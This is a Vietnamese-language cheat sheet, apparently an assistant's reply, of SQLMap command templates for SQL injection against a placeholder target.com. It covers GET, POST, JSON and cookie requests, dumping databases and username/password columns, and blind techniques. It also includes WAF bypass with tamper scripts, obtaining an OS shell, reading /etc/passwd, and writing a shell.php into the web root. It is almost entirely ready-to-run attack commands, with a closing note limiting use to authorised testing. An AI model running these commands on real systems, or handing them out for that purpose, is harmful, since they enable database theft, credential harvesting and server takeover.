Dưới đây là tổng hợp các **template sử dụng SQLMap** cho nhiều tình huống tấn công SQL injection phổ biến. Các lệnh được phân loại theo mục đích và dạng request, giúp bạn dễ dàng áp dụng khi pentest hợp pháp.

---

## 1. SQL Injection cơ bản với tham số GET

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

- `-u` : URL chứa tham số cần test.
- `--batch` : tự động chọn các lựa chọn mặc định, không hỏi.

**Thêm chỉ định DBMS nếu biết trước:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
```

**Tăng mức độ test (level, risk):**
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

---

## 2. POST form (dữ liệu gửi qua POST)

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" --batch
```

- `--data` : chuỗi dữ liệu POST, SQLMap sẽ tự test tất cả các tham số.

**Chỉ test một tham số cụ thể:**
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" -p username --batch
```

- `-p` : chỉ định tham số cần test.

**Dùng method POST với content-type JSON:**
```bash
sqlmap -u "http://target.com/api/login" --data='{"username":"admin","password":"pass"}' --batch
```

---

## 3. Kèm theo Cookie (session, xác thực)

```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=2kg9pgcnd306oi1v39k6ismlnt" --batch
```

**Nếu có nhiều header cần thêm:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc; token=xyz" --batch
```

**Dùng file cookie (định dạng Netscape):**
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie-file=/path/to/cookies.txt --batch
```

---

## 4. Sử dụng request từ file (Burp capture)

```bash
sqlmap -r request.txt --batch
```

- `request.txt` là file chứa raw HTTP request (có thể lưu từ Burp Suite, Fiddler).
- SQLMap sẽ tự động parse URL, method, headers, cookie, data và test tất cả các tham số.

**Chỉ test tham số cụ thể trong file:**
```bash
sqlmap -r request.txt -p username --batch
```

---

## 5. Lấy dữ liệu sau khi xác nhận injection

Sau khi phát hiện lỗi, bạn có thể dùng các lệnh sau:

### Lấy danh sách databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

### Lấy bảng của một database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables --batch
```

### Lấy dữ liệu từ bảng
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump --batch
```

- `--dump` : lấy toàn bộ dữ liệu trong bảng.
- Có thể thêm `--columns` để xem các cột trước.

### Lấy dữ liệu từ một cột cụ thể
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump --batch
```

---

## 6. Blind SQL Injection (time-based hoặc boolean-based)

Nếu ứng dụng không hiển thị lỗi, cần dùng kỹ thuật blind.

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=B --batch
```

- `--technique` : chỉ định kỹ thuật (B: boolean-based blind, T: time-based, E: error-based, U: union query, S: stacked queries).
- Ví dụ chỉ dùng time-based:
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5 --batch
```

- `--time-sec` : số giây delay để xác nhận time-based.

---

## 7. Bypass WAF (Web Application Firewall)

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --batch
```

- `--tamper` : dùng các script biến đổi payload để bypass WAF. Một số script phổ biến: `between`, `randomcase`, `space2comment`, `charencode`, `versionedmorekeywords`.

Kết hợp nhiều tamper:
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase,space2comment --batch
```

Xem danh sách tamper có sẵn:
```bash
sqlmap --list-tampers
```

---

## 8. Tấn công SQL injection nâng cao

### Lấy shell hệ điều hành (nếu DBMS cho phép)
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

### Đọc file từ server (MySQL, PostgreSQL)
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
```

### Ghi file lên server (MySQL)
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/file.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 9. Lưu phiên làm việc (session)

SQLMap có thể lưu lại tiến trình để dùng sau:

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
```

- `-s` : chỉ định file lưu session (thường dùng khi tấn công dài, cần resume).

Resume lại phiên trước:
```bash
sqlmap --resume=sqlmap_session.sqlite
```

---

## 10. Tùy chọn hữu ích khác

- **Ẩn thông tin không cần thiết (chỉ hiển thị kết quả quan trọng):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch --quiet
  ```

- **Tăng tốc bằng multi-threading (cẩn thận bị chặn):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --threads=10 --batch
  ```

- **Theo dõi request/response (debug):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -v 3 --batch
  ```

- **Sử dụng proxy (Burp) để phân tích:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
  ```

- **Chỉ phát hiện, không khai thác dữ liệu:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch --banner
  ```

---

## ⚠️ Lưu ý pháp lý
- **Chỉ sử dụng SQLMap trên các hệ thống bạn có quyền kiểm tra rõ ràng.**
- Việc tấn công hệ thống không được phép là vi phạm pháp luật và đạo đức nghề nghiệp.
- Trong môi trường thực tế, nên có sự đồng ý bằng văn bản của chủ sở hữu hệ thống.

---

Hy vọng các template trên giúp bạn sử dụng SQLMap hiệu quả trong các cuộc kiểm thử bảo mật hợp pháp. Nếu cần chi tiết hơn về một tùy chọn, hãy dùng `sqlmap -hh` hoặc tham khảo tài liệu chính thức.